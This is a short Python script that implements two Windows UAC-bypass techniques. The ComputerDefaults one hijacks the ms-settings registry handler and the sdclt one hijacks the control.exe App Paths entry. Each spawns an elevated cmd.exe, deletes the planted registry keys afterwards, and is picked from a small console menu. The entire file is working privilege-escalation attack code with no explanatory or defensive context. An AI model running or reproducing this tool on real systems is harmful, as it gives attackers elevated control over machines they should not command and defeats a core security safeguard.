# 2018.12.1
#request python3
import winreg
import os
import sys
#def reglist():
def computerDefaultkey(cmd):
	try:

		##Create DelegateExecute
		winreg.CreateKey(winreg.HKEY_CURRENT_USER,'Software\Classes\ms-settings\shell\open\command')
		reghand = winreg.OpenKey(winreg.HKEY_CURRENT_USER,'Software\Classes\ms-settings\shell\open\command',0,winreg.KEY_WRITE)
		winreg.SetValueEx(reghand,'DelegateExecute','0',winreg.REG_SZ,'')
		print('Create DelegateExecute reg success ')
		winreg.CloseKey(reghand)
		##Create Default
		winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
		reghand = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0,winreg.KEY_WRITE)
		winreg.SetValueEx(reghand,None,'0', winreg.REG_SZ,cmd)
		print('Create Default reg success ')
		winreg.CloseKey(reghand)
		#reg_value, reg_type = winreg.QueryValueEx(reghand,'URL Protocol')
		#print(reg_value)
		#winreg.HKEY_CURRENT_USER

	except OSError:
		raise
def De_exec():
	try:
		cmd="C:\Windows\System32\cmd.exe"
		computerDefaultkey(cmd)
		os.system(r'C:\windows\system32\ComputerDefaults.exe')
		winreg.DeleteKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
		print('Del reg success!')
		return 1
	except OSError:
		sys.exit(1)

def sdclt_bypass(cmd):
	try:
		#print("sdc")
		##Create
		winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe')
		reghand = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe',0,winreg.KEY_WRITE)
		winreg.SetValueEx(reghand,None,'0',winreg.REG_SZ,cmd)
		print('Create control.exe reg success! ')
		winreg.CloseKey(reghand)
	except OSError:
		raise
def sdclt_exec():
	try:
		cmd = "C:\Windows\System32\cmd.exe"
		sdclt_bypass(cmd)
		os.system(r'sdclt.exe')
		winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe')
		print('Del reg success!')
		return 1
	except OSError:
		sys.exit(1)

def main():
	print("##########################")
	print("Aviliable:\n")
	print("##########################")
	print("1.sdclt.exe(need Admin Pirv)\n2.defaultControl\nF.exit")
	#De_exec()
	options = input("Please Choose One\n")
	#options = sys.argv[1]
	if options == '1':
		sdclt_exec()
	elif options == '2':
		De_exec()
	elif options == '0':
		sys.exit(1)
	#sdclt.exec need Admin
	#sdclt_exec()

main()
